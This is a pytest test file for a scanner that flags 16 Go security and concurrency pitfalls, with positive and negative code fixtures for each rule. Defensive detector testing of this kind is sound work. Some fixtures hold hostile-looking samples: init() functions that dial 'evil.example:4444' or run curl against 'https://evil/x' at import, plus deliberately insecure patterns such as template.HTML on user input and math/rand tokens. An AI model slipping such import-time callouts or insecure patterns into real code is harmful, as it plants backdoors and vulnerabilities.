"""Tests for ``scripts/lib/go_specific_patterns.py``.

Wave 21 impl-I — verifies 16 Go-runtime attack-surface rules each
have a positive + (1-2) negative tests. Pure-stdlib pytest.

The rule catalogue covers Go runtime/stdlib pathology the existing
detector stack does NOT touch: http.Server zero-value (slowloris),
http.DefaultClient no-timeout, DefaultServeMux global registration,
unsafe.Pointer arithmetic and reflect.SliceHeader misuse, sync.Mutex
value-copy, unprotected map concurrent access, missing defer
mu.Unlock, goroutine leak via <-ch without ctx.Done, time.After in
select-in-loop, unrecovered goroutine panics, context.Background in
HTTP handlers, template.HTML/JS type-conversion XSS, math/rand for
security tokens, ignored crypto/rand.Read errors, init() network
I/O at import, and os.Setenv race on Go <1.21.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

# Make ``scripts/lib`` importable without packaging — same trick used
# by every other ``test_*_patterns.py`` file in this repo.
_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT / "scripts" / "lib"))

import go_specific_patterns as gsp  # type: ignore[import-not-found]  # noqa: E402

# ---- Module-level invariants -------------------------------------------


def test_rules_have_unique_ids() -> None:
    """Every Rule.id is unique — duplicates would dedupe-collide."""
    ids = [r.id for r in gsp.RULES]
    assert len(ids) == len(set(ids)), f"duplicate rule ids: {ids}"


def test_rules_have_compiled_patterns() -> None:
    """Every Rule.pattern is a compiled regex with MULTILINE flag.

    Go source is case-sensitive — `Http` is NOT `http` in Go parsing.
    So unlike agent_config_patterns (which uses IGNORECASE for prose),
    this module deliberately omits IGNORECASE.
    """
    for rule in gsp.RULES:
        assert isinstance(rule.pattern, re.Pattern), rule.id
        assert rule.pattern.flags & re.MULTILINE, rule.id
        # IGNORECASE MUST be off — Go is case-sensitive
        assert not (rule.pattern.flags & re.IGNORECASE), rule.id


def test_rules_have_valid_severity() -> None:
    """Severity is one of the four canonical strings."""
    allowed = {"CRITICAL", "HIGH", "MEDIUM", "LOW"}
    for rule in gsp.RULES:
        assert rule.severity in allowed, f"{rule.id}: {rule.severity}"


def test_rules_have_owasp_asi_mapping() -> None:
    """Every rule carries an OWASP-ASI mapping."""
    for rule in gsp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id


def test_scan_empty_returns_empty() -> None:
    """Empty input returns empty findings list."""
    assert gsp.scan_text("") == []
    assert gsp.scan_text("\n\n") == []


def test_rules_count_matches_proposals() -> None:
    """We implemented 16 detectors (15 proposals + G13a sub-rule)."""
    assert len(gsp.RULES) == 16


def test_finding_namedtuple_shape() -> None:
    """Finding has the same 7 fields as agent_config_patterns.Finding."""
    f = gsp.Finding(
        rule_id="x", line=1, column=1, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-05",
    )
    assert f.rule_id == "x"
    assert f.line == 1
    assert f.column == 1
    assert f.matched_text == "m"


def _hits(rule_id: str, text: str) -> list[gsp.Finding]:
    """Return only findings of ``rule_id`` from ``scan_text(text)``.

    Used per-rule so other rule-co-firings (e.g. a goroutine that also
    triggers the recover rule and the channel-leak rule) don't confuse
    the per-rule assertions.
    """
    return [f for f in gsp.scan_text(text) if f.rule_id == rule_id]


# ---- G1: http.Server with no timeouts ----------------------------------


def test_http_server_no_timeouts_positive() -> None:
    """&http.Server{} without timeouts fires."""
    src = (
        'srv := &http.Server{\n'
        '    Addr:    ":8080",\n'
        '    Handler: mux,\n'
        '}\n'
    )
    assert _hits("go-http-server-no-timeouts", src)


def test_http_server_listen_and_serve_direct_positive() -> None:
    """http.ListenAndServe(addr, h) direct call fires (uses default Server)."""
    src = 'http.ListenAndServe(":8080", mux)'
    assert _hits("go-http-server-no-timeouts", src)


def test_http_server_listen_and_serve_tls_positive() -> None:
    """http.ListenAndServeTLS also fires."""
    src = 'http.ListenAndServeTLS(":443", "cert.pem", "key.pem", mux)'
    assert _hits("go-http-server-no-timeouts", src)


def test_http_server_with_all_timeouts_negative() -> None:
    """&http.Server{...} with all three timeouts does NOT fire."""
    src = (
        'srv := &http.Server{\n'
        '    Addr:         ":8080",\n'
        '    Handler:      mux,\n'
        '    ReadTimeout:  10 * time.Second,\n'
        '    WriteTimeout: 15 * time.Second,\n'
        '    IdleTimeout:  60 * time.Second,\n'
        '}\n'
    )
    assert not _hits("go-http-server-no-timeouts", src)


# ---- G2: http.DefaultClient / zero-value http.Client -------------------


def test_http_get_positive() -> None:
    """http.Get(url) fires."""
    src = 'resp, err := http.Get(url)'
    assert _hits("go-http-default-client", src)


def test_http_post_positive() -> None:
    """http.Post(url, ...) fires."""
    src = 'resp, _ := http.Post(url, "application/json", body)'
    assert _hits("go-http-default-client", src)


def test_http_default_client_do_positive() -> None:
    """http.DefaultClient.Do(req) fires."""
    src = 'resp, _ := http.DefaultClient.Do(req)'
    assert _hits("go-http-default-client", src)


def test_http_client_zero_value_positive() -> None:
    """&http.Client{} zero-value fires."""
    src = 'c := &http.Client{}'
    assert _hits("go-http-default-client", src)


def test_http_client_with_timeout_negative() -> None:
    """http.Client{Timeout: ...} does NOT fire."""
    src = 'c := &http.Client{Timeout: 10 * time.Second}'
    assert not _hits("go-http-default-client", src)


# ---- G3: DefaultServeMux package-global registration -------------------


def test_default_servemux_handlefunc_positive() -> None:
    """http.HandleFunc("/path", h) at package level fires."""
    src = 'http.HandleFunc("/debug/dump", dumpHandler)'
    assert _hits("go-default-servemux-handlefunc", src)


def test_default_servemux_handle_positive() -> None:
    """http.Handle(...) also fires."""
    src = 'http.Handle("/path", http.HandlerFunc(handler))'
    assert _hits("go-default-servemux-handlefunc", src)


def test_servemux_instance_method_negative() -> None:
    """mux.HandleFunc(...) (instance method) does NOT fire."""
    src = 'mux.HandleFunc("/path", handler)'
    assert not _hits("go-default-servemux-handlefunc", src)


def test_servemux_dotted_negative() -> None:
    """myMux.HandleFunc(...) does NOT fire — only bare http.HandleFunc."""
    src = 'myMux.HandleFunc("/path", handler)'
    assert not _hits("go-default-servemux-handlefunc", src)


# ---- G4: unsafe.Pointer / reflect.SliceHeader --------------------------


def test_unsafe_pointer_arithmetic_positive() -> None:
    """unsafe.Pointer(uintptr(unsafe.Pointer(...)) arithmetic fires."""
    src = 'end := unsafe.Pointer(uintptr(unsafe.Pointer(&buf[0])) + uintptr(n))'
    assert _hits("go-unsafe-pointer-slice-walk", src)


def test_reflect_sliceheader_construction_positive() -> None:
    """reflect.SliceHeader{...} direct construction fires."""
    # The regex specifically matches the composite-literal form
    # `reflect.SliceHeader{...}` (with `{`) — the `var sh reflect.SliceHeader`
    # bare declaration does NOT fire by itself (no `{`), but constructing
    # the value via the composite literal does.
    src = 's := reflect.SliceHeader{Data: uintptr(p), Len: n, Cap: n}'
    assert _hits("go-unsafe-pointer-slice-walk", src)


def test_unsafe_slice_call_positive() -> None:
    """unsafe.Slice((*T)(p), n) fires."""
    src = 's := unsafe.Slice((*byte)(p), userLen)'
    assert _hits("go-unsafe-pointer-slice-walk", src)


def test_unsafe_reinterpret_cast_positive() -> None:
    """*(*[]byte)(unsafe.Pointer(&sh)) reinterpret cast fires."""
    src = 's := *(*[]byte)(unsafe.Pointer(&sh))'
    assert _hits("go-unsafe-pointer-slice-walk", src)


def test_unsafe_no_dangerous_pattern_negative() -> None:
    """Plain `make([]byte, n)` and `copy(s, src)` do NOT fire."""
    src = (
        's := make([]byte, n)\n'
        'copy(s, src)\n'
    )
    assert not _hits("go-unsafe-pointer-slice-walk", src)


# ---- G5: sync.Mutex passed by value ------------------------------------


def test_mutex_by_value_parameter_positive() -> None:
    """func process(m sync.Mutex) fires."""
    src = 'func process(m sync.Mutex) {\n    m.Lock()\n}\n'
    assert _hits("go-mutex-by-value", src)


def test_waitgroup_by_value_positive() -> None:
    """func work(wg sync.WaitGroup) fires."""
    src = 'func work(wg sync.WaitGroup) {\n    wg.Done()\n}\n'
    assert _hits("go-mutex-by-value", src)


def test_mutex_pointer_negative() -> None:
    """func process(m *sync.Mutex) does NOT fire."""
    src = 'func process(m *sync.Mutex) {\n    m.Lock()\n}\n'
    assert not _hits("go-mutex-by-value", src)


def test_waitgroup_pointer_negative() -> None:
    """func work(wg *sync.WaitGroup) does NOT fire."""
    src = 'func work(wg *sync.WaitGroup) {\n    wg.Done()\n}\n'
    assert not _hits("go-mutex-by-value", src)


# ---- G6: unprotected map in struct -------------------------------------


def test_unprotected_map_struct_positive() -> None:
    """struct with map field but no lock fires."""
    src = (
        'type Stats struct {\n'
        '    counts map[string]int\n'
        '    name   string\n'
        '}\n'
    )
    assert _hits("go-map-concurrent-access-no-lock", src)


def test_map_with_mutex_negative() -> None:
    """struct with map AND sync.Mutex does NOT fire."""
    src = (
        'type Stats struct {\n'
        '    mu     sync.Mutex\n'
        '    counts map[string]int\n'
        '}\n'
    )
    assert not _hits("go-map-concurrent-access-no-lock", src)


def test_map_with_rwmutex_negative() -> None:
    """struct with map AND sync.RWMutex does NOT fire."""
    src = (
        'type Stats struct {\n'
        '    mu     sync.RWMutex\n'
        '    counts map[string]int\n'
        '}\n'
    )
    assert not _hits("go-map-concurrent-access-no-lock", src)


def test_sync_map_negative() -> None:
    """struct using sync.Map directly does NOT fire (no built-in map)."""
    src = (
        'type Stats struct {\n'
        '    counts sync.Map\n'
        '}\n'
    )
    assert not _hits("go-map-concurrent-access-no-lock", src)


# ---- G7: .Lock() without defer .Unlock() + early return ----------------


def test_lock_early_return_no_defer_positive() -> None:
    """c.mu.Lock() followed by early return without defer Unlock fires."""
    src = (
        'func (c *Cache) Save(k, v string) error {\n'
        '    c.mu.Lock()\n'
        '    if err := validate(k); err != nil {\n'
        '        return err\n'
        '    }\n'
        '    c.m[k] = v\n'
        '    c.mu.Unlock()\n'
        '    return nil\n'
        '}\n'
    )
    assert _hits("go-defer-unlock-missing-early-return", src)


def test_lock_with_defer_unlock_negative() -> None:
    """c.mu.Lock() immediately followed by defer c.mu.Unlock() does NOT fire."""
    src = (
        'func (c *Cache) Save(k, v string) error {\n'
        '    c.mu.Lock()\n'
        '    defer c.mu.Unlock()\n'
        '    if err := validate(k); err != nil {\n'
        '        return err\n'
        '    }\n'
        '    c.m[k] = v\n'
        '    return nil\n'
        '}\n'
    )
    assert not _hits("go-defer-unlock-missing-early-return", src)


# ---- G8: goroutine reads channel without ctx.Done ----------------------


def test_goroutine_channel_recv_no_ctx_positive() -> None:
    """go func() { <-ch } without ctx.Done fires."""
    src = (
        'go func() {\n'
        '    j := <-ch\n'
        '    process(j)\n'
        '}()\n'
    )
    assert _hits("go-goroutine-leak-unbounded-channel-recv", src)


def test_goroutine_channel_recv_with_ctx_negative() -> None:
    """go func() { select { case <-ctx.Done(): ... case j := <-ch: ... } } does NOT fire."""
    src = (
        'go func() {\n'
        '    select {\n'
        '    case j := <-ch:\n'
        '        process(j)\n'
        '    case <-ctx.Done():\n'
        '        return\n'
        '    }\n'
        '}()\n'
    )
    assert not _hits("go-goroutine-leak-unbounded-channel-recv", src)


# ---- G9: time.After in select-in-loop ----------------------------------


def test_time_after_in_select_in_for_positive() -> None:
    """`for { select { case <-time.After(d): ... } }` fires."""
    src = (
        'for {\n'
        '    select {\n'
        '    case msg := <-ch:\n'
        '        handle(msg)\n'
        '    case <-time.After(5 * time.Second):\n'
        '        return\n'
        '    }\n'
        '}\n'
    )
    assert _hits("go-time-after-in-select-in-loop", src)


def test_time_after_one_shot_negative() -> None:
    """One-shot `time.After` (no for-loop) does NOT fire."""
    src = (
        'select {\n'
        'case msg := <-ch:\n'
        '    handle(msg)\n'
        'case <-time.After(5 * time.Second):\n'
        '    return\n'
        '}\n'
    )
    assert not _hits("go-time-after-in-select-in-loop", src)


def test_time_newtimer_in_loop_negative() -> None:
    """`time.NewTimer + Reset` idiom (correct fix) does NOT fire."""
    src = (
        't := time.NewTimer(5 * time.Second)\n'
        'defer t.Stop()\n'
        'for {\n'
        '    select {\n'
        '    case msg := <-ch:\n'
        '        handle(msg)\n'
        '        t.Reset(5 * time.Second)\n'
        '    case <-t.C:\n'
        '        return\n'
        '    }\n'
        '}\n'
    )
    assert not _hits("go-time-after-in-select-in-loop", src)


# ---- G10: goroutine without recover ------------------------------------


def test_goroutine_no_recover_positive() -> None:
    """go func() with risky body but no defer/recover fires."""
    src = (
        'go func() {\n'
        '    payload := input.(map[string]any)\n'
        '    process(payload)\n'
        '    doSomething()\n'
        '    moreWork()\n'
        '}()\n'
    )
    assert _hits("go-goroutine-panic-no-recover", src)


def test_goroutine_with_recover_negative() -> None:
    """go func() that begins with defer/recover does NOT fire."""
    src = (
        'go func() {\n'
        '    defer func() {\n'
        '        if r := recover(); r != nil {\n'
        '            log.Printf("panic: %v", r)\n'
        '        }\n'
        '    }()\n'
        '    payload, ok := input.(map[string]any)\n'
        '    if !ok {\n'
        '        return\n'
        '    }\n'
        '    process(payload)\n'
        '}()\n'
    )
    assert not _hits("go-goroutine-panic-no-recover", src)


# ---- G11: context.Background in HTTP handler ---------------------------


def test_context_background_in_handler_positive() -> None:
    """`context.Background()` inside HTTP handler body fires."""
    src = (
        'func handler(w http.ResponseWriter, r *http.Request) {\n'
        '    rows, _ := db.QueryContext(context.Background(), "SELECT 1")\n'
        '    _ = rows\n'
        '}\n'
    )
    assert _hits("go-context-background-in-handler", src)


def test_context_todo_in_handler_positive() -> None:
    """`context.TODO()` inside HTTP handler also fires."""
    src = (
        'func handler(w http.ResponseWriter, r *http.Request) {\n'
        '    rows, _ := db.QueryContext(context.TODO(), "SELECT 1")\n'
        '    _ = rows\n'
        '}\n'
    )
    assert _hits("go-context-background-in-handler", src)


def test_request_context_in_handler_negative() -> None:
    """`r.Context()` (correct usage) does NOT fire."""
    src = (
        'func handler(w http.ResponseWriter, r *http.Request) {\n'
        '    rows, _ := db.QueryContext(r.Context(), "SELECT 1")\n'
        '    _ = rows\n'
        '}\n'
    )
    assert not _hits("go-context-background-in-handler", src)


def test_context_background_outside_handler_negative() -> None:
    """`context.Background()` in main() (not a handler) does NOT fire."""
    src = (
        'func main() {\n'
        '    ctx := context.Background()\n'
        '    run(ctx)\n'
        '}\n'
    )
    assert not _hits("go-context-background-in-handler", src)


# ---- G12: template.HTML / JS type conversion XSS -----------------------


def test_template_html_userinput_positive() -> None:
    """template.HTML(userBio) fires (non-literal arg)."""
    src = 'data := template.HTML(userBio)'
    assert _hits("go-template-html-js-type-conversion-xss", src)


def test_template_js_userinput_positive() -> None:
    """template.JS(userScript) fires."""
    src = 'data := template.JS(userScript)'
    assert _hits("go-template-html-js-type-conversion-xss", src)


def test_template_url_userinput_positive() -> None:
    """template.URL(userLink) fires."""
    src = 'href := template.URL(userLink)'
    assert _hits("go-template-html-js-type-conversion-xss", src)


def test_template_htmlattr_userinput_positive() -> None:
    """template.HTMLAttr(userAttr) fires."""
    src = 'attr := template.HTMLAttr(userAttr)'
    assert _hits("go-template-html-js-type-conversion-xss", src)


def test_template_html_string_literal_negative() -> None:
    """template.HTML("<b>fixed</b>") with literal does NOT fire."""
    src = 'data := template.HTML("<b>fixed bold</b>")'
    assert not _hits("go-template-html-js-type-conversion-xss", src)


def test_template_html_backtick_literal_negative() -> None:
    """template.HTML(`raw markup`) with backtick literal does NOT fire."""
    src = 'data := template.HTML(`<b>raw markup</b>`)'
    assert not _hits("go-template-html-js-type-conversion-xss", src)


# ---- G13: math/rand for security ---------------------------------------


def test_math_rand_with_token_keyword_positive() -> None:
    """math/rand import + token keyword fires."""
    src = (
        'import (\n'
        '    "math/rand"\n'
        '    "time"\n'
        ')\n'
        '\n'
        'func newToken() string {\n'
        '    b := make([]byte, 32)\n'
        '    rand.Read(b)\n'
        '    return string(b)\n'
        '}\n'
    )
    assert _hits("go-math-rand-for-security", src)


def test_math_rand_seed_time_positive() -> None:
    """rand.Seed(time.Now().UnixNano()) fires unconditionally."""
    src = 'rand.Seed(time.Now().UnixNano())'
    assert _hits("go-math-rand-for-security", src)


def test_security_named_function_with_math_rand_positive() -> None:
    """func newSessionID() with rand.Read fires (security-keyword function name)."""
    src = (
        'func newSessionID() string {\n'
        '    b := make([]byte, 16)\n'
        '    rand.Read(b)\n'
        '    return hex.EncodeToString(b)\n'
        '}\n'
    )
    assert _hits("go-math-rand-for-security", src)


def test_math_rand_no_security_keyword_negative() -> None:
    """math/rand used only for noise / shuffling (no security keyword) does NOT fire."""
    src = (
        'import "math/rand"\n'
        '\n'
        'func shuffle(items []int) {\n'
        '    rand.Shuffle(len(items), func(i, j int) {\n'
        '        items[i], items[j] = items[j], items[i]\n'
        '    })\n'
        '}\n'
    )
    assert not _hits("go-math-rand-for-security", src)


# ---- G13a: crypto/rand error ignored -----------------------------------


def test_cryptorand_error_blank_discard_positive() -> None:
    """`_, _ = rand.Read(b)` fires (explicit double blank discard)."""
    src = '_, _ = rand.Read(b)'
    assert _hits("go-cryptorand-error-ignored", src)


def test_cryptorand_walrus_blank_discard_positive() -> None:
    """`_, _ := rand.Read(b)` (walrus) fires."""
    src = '_, _ := rand.Read(b)'
    assert _hits("go-cryptorand-error-ignored", src)


def test_cryptorand_bare_call_positive() -> None:
    """Bare `rand.Read(b)` as statement fires."""
    src = (
        'b := make([]byte, 32)\n'
        'rand.Read(b)\n'
    )
    assert _hits("go-cryptorand-error-ignored", src)


def test_cryptorand_error_handled_negative() -> None:
    """`n, err := rand.Read(b); if err != nil ...` does NOT fire."""
    src = (
        'n, err := rand.Read(b)\n'
        'if err != nil {\n'
        '    return err\n'
        '}\n'
        '_ = n\n'
    )
    assert not _hits("go-cryptorand-error-ignored", src)


# ---- G14: init() network I/O -------------------------------------------


def test_init_http_get_positive() -> None:
    """func init() { http.Get(...) } fires."""
    src = (
        'func init() {\n'
        '    resp, _ := http.Get("https://example.com/config")\n'
        '    defer resp.Body.Close()\n'
        '    loadConfig(resp.Body)\n'
        '}\n'
    )
    assert _hits("go-init-network-io", src)


def test_init_net_dial_positive() -> None:
    """func init() { net.Dial(...) } fires."""
    src = (
        'func init() {\n'
        '    conn, _ := net.Dial("tcp", "evil.example:4444")\n'
        '    conn.Close()\n'
        '}\n'
    )
    assert _hits("go-init-network-io", src)


def test_init_exec_command_positive() -> None:
    """func init() { exec.Command(...) } fires."""
    src = (
        'func init() {\n'
        '    exec.Command("curl", "https://evil/x").Run()\n'
        '}\n'
    )
    assert _hits("go-init-network-io", src)


def test_init_benign_negative() -> None:
    """func init() doing only pure-Go logic does NOT fire."""
    src = (
        'func init() {\n'
        '    registerDriver("sqlite", driverFactory)\n'
        '    defaultConfig = newConfig()\n'
        '}\n'
    )
    assert not _hits("go-init-network-io", src)


def test_init_no_init_func_negative() -> None:
    """A file with no init() does NOT fire on http.Get in main()."""
    src = (
        'func main() {\n'
        '    resp, _ := http.Get("https://example.com")\n'
        '    _ = resp\n'
        '}\n'
    )
    assert not _hits("go-init-network-io", src)


# ---- G15: os.Setenv race -----------------------------------------------


def test_os_setenv_with_goroutine_positive() -> None:
    """os.Setenv co-located with `go func()` fires."""
    src = (
        'os.Setenv("KEY_A", "value")\n'
        'go func() {\n'
        '    work()\n'
        '}()\n'
    )
    assert _hits("go-os-setenv-race-pre-1.21", src)


def test_os_setenv_goroutine_first_positive() -> None:
    """`go func()` BEFORE os.Setenv also fires."""
    src = (
        'go func() {\n'
        '    work()\n'
        '}()\n'
        'os.Setenv("KEY_A", "value")\n'
    )
    assert _hits("go-os-setenv-race-pre-1.21", src)


def test_os_unsetenv_with_goroutine_positive() -> None:
    """os.Unsetenv also fires when reachable from goroutine."""
    src = (
        'go worker()\n'
        'os.Unsetenv("OLD_KEY")\n'
    )
    assert _hits("go-os-setenv-race-pre-1.21", src)


def test_os_setenv_alone_negative() -> None:
    """os.Setenv with no goroutines does NOT fire."""
    src = (
        'func main() {\n'
        '    os.Setenv("DEFAULT_FOO", "1")\n'
        '    run()\n'
        '}\n'
    )
    assert not _hits("go-os-setenv-race-pre-1.21", src)


# ---- End-to-end scan_text composition ----------------------------------


def test_scan_text_returns_findings_sorted_by_line() -> None:
    """Findings are sorted by (line, column, rule_id)."""
    src = (
        'package main\n'                                       # line 1
        'import "net/http"\n'                                  # line 2
        '\n'
        'func main() {\n'
        '    http.HandleFunc("/x", h)\n'                       # line 5 — G3
        '    http.ListenAndServe(":8080", nil)\n'              # line 6 — G1
        '}\n'
    )
    findings = gsp.scan_text(src)
    # Both rules fire
    assert any(f.rule_id == "go-default-servemux-handlefunc" for f in findings)
    assert any(f.rule_id == "go-http-server-no-timeouts" for f in findings)
    # Findings must be ordered by line ascending
    lines = [f.line for f in findings]
    assert lines == sorted(lines)


def test_scan_text_deduplicates_same_rule_same_position() -> None:
    """A single rule firing at the same (line, col) twice emits once."""
    src = 'http.ListenAndServe(":8080", mux)'
    findings = gsp.scan_text(src)
    keys = [(f.rule_id, f.line, f.column) for f in findings]
    assert len(keys) == len(set(keys)), f"duplicate findings: {keys}"


def test_scan_text_truncates_long_matches_to_200_chars() -> None:
    """Matched text over 200 chars is truncated with an ellipsis."""
    # Build a synthetic long unsafe.Slice call with a giant arg name
    long_arg = "x" * 500
    src = f'unsafe.Slice((*byte)(p), {long_arg})'
    findings = gsp.scan_text(src)
    target = [f for f in findings if f.rule_id == "go-unsafe-pointer-slice-walk"]
    for f in target:
        if len(f.matched_text) > 200:
            assert f.matched_text.endswith("…"), repr(f.matched_text)


def test_scan_real_world_unsafe_handler() -> None:
    """End-to-end: real-world handler with multiple Go issues fires multiple rules."""
    src = (
        'package main\n'
        '\n'
        'import (\n'
        '    "context"\n'
        '    "math/rand"\n'
        '    "net/http"\n'
        ')\n'
        '\n'
        'func tokenHandler(w http.ResponseWriter, r *http.Request) {\n'
        '    ctx := context.Background()\n'                       # G11
        '    b := make([]byte, 32)\n'
        '    rand.Read(b)\n'                                       # G13 path
        '    _, _ = w.Write(b)\n'
        '    _ = ctx\n'
        '}\n'
        '\n'
        'func main() {\n'
        '    http.HandleFunc("/token", tokenHandler)\n'           # G3
        '    http.ListenAndServe(":8080", nil)\n'                  # G1
        '}\n'
    )
    findings = gsp.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    # We expect at least these to fire
    expected = {
        "go-default-servemux-handlefunc",
        "go-http-server-no-timeouts",
        "go-context-background-in-handler",
    }
    assert expected.issubset(rule_ids), f"missing: {expected - rule_ids}; got: {rule_ids}"
